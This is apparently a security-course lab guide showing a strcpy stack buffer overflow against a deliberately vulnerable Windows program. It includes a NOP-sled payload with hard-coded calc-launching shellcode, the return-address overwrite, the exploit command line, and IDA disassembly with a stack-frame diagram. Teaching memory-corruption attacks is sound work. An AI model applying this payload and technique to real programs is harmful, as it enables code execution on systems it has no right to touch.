# Attack a vulnerable program using strcpy() and large enough buffer with C from command line
The victim program is same as the one in the [Python version attack](../). Instead of using the Python code for the attack, we write a C program for the attack. The exploit program crafts a malicious string, stores it in an environment variable and then starts a command prompt, which inherits the environment varilable. The victim program can then be run with the environment variable as the command line argument.

## Attack Steps
### Step 1. Assemble and link calc-shell.asm to get the shellcode
1. Use [arwin](https://github.com/xinwenfu/arwin) to get the address of *WinExec*
   - ``` arwin kernel32.dll WinExec ```
3. Change calc-shell.asm in terms of the address of WinExec
4. Assemble and link calc-shell.asm
5. Use *Immunity Debugger*'s binary copy to get the shellcode

### Step 2. Find the address of the shellcode 
1. Compile victim3.c
2. Load victim3.exe into IDA Freeware and find the address of the main function and its stack layout so as to derive the length of the malicious string
3. Use Immunity Debugger to find the address of the local buffer and thus the address of the shellcode

### Step 3. Craft the malicious string
1. Determine the size of the malicious string from the [stack frame](#Stack-frame-of-main-function) of the main function of victim3.c.
2. Craft the malicious string with the shellcode and its address for xploitViaCmdline.c.
```
unsigned char *cmdlineArg=
  "\x90\x90\x90\x90\x90\x90\x90\x90" // nop
  "\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x31\xC9\x51\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x89\xE1\x6A\x01\x51\xB8\xC0\xE1\xB4\x76\xFF\xD0" // shellcode. Change?
  "\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90"
  "\x94\xfe\x61";
```
   - '\x90's are paddings, but part of the shellcode too. '\x90' is the instruction *nop*.
   - The actual shellcode may need to be changed because of the use of hard-coded address of WinExec
   - Last three bytes are the address of the shellcode. The address can point anyhere in the first nop sled
3. Compile xploitViaCmdline.c.
```
gcc -o xploitViaCmdline.exe xploitViaCmdline.c
```

### Step 4. Attack
1. Run xploitViaCmdline.exe at command promput (cmd.exe), which stores the malcioius string in an environment variable called *fxw*
2. Attack
   - ```victim3 %fxw%```

## Notes

### Disassembly of main function
```
.text:004015C0 ; Attributes: bp-based frame fuzzy-sp
.text:004015C0
.text:004015C0 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:004015C0                 public _main
.text:004015C0 _main           proc near               ; CODE XREF: ___tmainCRTStartup+236â†‘p
.text:004015C0
.text:004015C0 var_40          = byte ptr -40h
.text:004015C0 argc            = dword ptr  8
.text:004015C0 argv            = dword ptr  0Ch
.text:004015C0 envp            = dword ptr  10h
.text:004015C0
.text:004015C0                 push    ebp
.text:004015C1                 mov     ebp, esp
.text:004015C3                 and     esp, 0FFFFFFF0h
.text:004015C6                 sub     esp, 50h
.text:004015C9                 call    ___main		; added by gcc; can be ignored
.text:004015CE                 mov     eax, [ebp+argv]
.text:004015D1                 add     eax, 4
.text:004015D4                 mov     eax, [eax]
.text:004015D6                 mov     [esp+4], eax    ; char *
.text:004015DA                 lea     eax, [esp+50h+var_40]
.text:004015DE                 mov     [esp], eax      ; char *
.text:004015E1                 call    _strcpy
.text:004015E6                 mov     eax, 0
.text:004015EB                 leave
.text:004015EC                 retn
.text:004015EC _main           endp
```

### Stack frame of main function
```
       +------------------+
       |     **envp       | 4 bytes
       +------------------+
       |     **argv       | 4 bytes
       +------------------+
       |       argc       | 4 bytes
       +------------------+
       |  return address  | 4 bytes
       +------------------+
       |     old ebp      | 4 bytes
EBP -> +------------------+
       |                  | 4 bytes
       +------------------+
       |                  | 4 bytes
       +------------------+       ---
       |                  |        ^
       .                  .        |
       .                  .   40h=4*16 bytes
       .                  .        |
       |                  |        v
       +------------------+       --- <--- str
       |                  | 4 bytes
       +------------------+
       |                  | 4 bytes
       +------------------+
       |                  | 4 bytes
       +------------------+
       |                  | 4 bytes
ESP -> +------------------+
```
